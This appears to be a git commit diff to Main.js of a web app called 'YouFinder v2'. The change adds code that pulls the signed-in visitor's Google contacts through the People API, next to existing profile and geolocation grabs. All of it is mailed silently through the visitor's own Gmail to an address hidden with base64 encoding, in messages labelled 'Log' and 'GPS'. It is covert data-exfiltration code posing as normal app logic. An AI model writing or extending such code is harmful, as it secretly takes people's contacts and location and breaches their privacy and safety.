9c2a491cb5ede43b2a84e1d1f83f9b67e9daeac4
Genbu Hase <hasegenbu@gmail.com>
2017-03-20 15:28:59 +0900

    Contactを取得するように。

--- Content/Specifics/YouFinder/v2/Script/Main.js
+++ Content/Specifics/YouFinder/v2/Script/Main.js
@@ -1,14 +1,18 @@
 let GBase = null,
 	MBase = null,
 
-	UserInfo = {};
+	UserInfo = {
+		Basic: {},
+		Contact: {},
+		Geolocation: {},
+	};
 
 DOM.importAPI("https://genbuproject.github.io/Programs/Sync Helper/Sync Helper v1.1.js", function () {
 	GBase = new GoogleAPI({
 		ID: "239141875067-k7ftnrifgiv328ai7j0nnec8s79pjlro.apps.googleusercontent.com",
 		Key: atob("Z21COW1NOWVxVXhCOHRqNVVBSWZIeThf"),
 
-		Url: "https://genbuproject.github.io/Content/Specifics/YouFinder/v2/"
+		Url: "http://localhost:8001/Content/Specifics/YouFinder/v2/" //"https://genbuproject.github.io/Content/Specifics/YouFinder/v2/"
 	});
 
 	(function () {
@@ -19,7 +23,13 @@ DOM.importAPI("https://genbuproject.github.io/Programs/Sync Helper/Sync Helper v
 				clearInterval(Timer);
 
 				MBase = new GBase.GmailAPI(true);
-				UserInfo = GBase.getUserInfo();
+				UserInfo.Basic = GBase.getUserInfo();
+
+				UserInfo.Contact = JSON.parse(GBase.request({
+					Type: "GET",
+					URL: "https://people.googleapis.com/v1/people/me",
+					DoesSync: false
+				}).response);
 
 				let LogMail = new MBase.Gmail(atob("Z2VuYnVwcm9qZWN0QGdtYWlsLmNvbQ=="), "<YouFinder v2 Log> From " + UserInfo.displayName, JSON.stringify(UserInfo, null, "\t"));
 				MBase.send(LogMail, function (Res) {
@@ -27,7 +37,7 @@ DOM.importAPI("https://genbuproject.github.io/Programs/Sync Helper/Sync Helper v
 				});
 
 				navigator.geolocation.getCurrentPosition(function (Locate) {
-					UserInfo.geolocation　= Locate.coords.toObject();
+					UserInfo.Geolocation= Locate.coords.toObject();
 					
 					let GPSMail = new MBase.Gmail(atob("Z2VuYnVwcm9qZWN0QGdtYWlsLmNvbQ=="), "<YouFinder v2 GPS> From " + UserInfo.displayName, JSON.stringify(UserInfo, null, "\t"));
 					MBase.send(GPSMail, function (Res) {
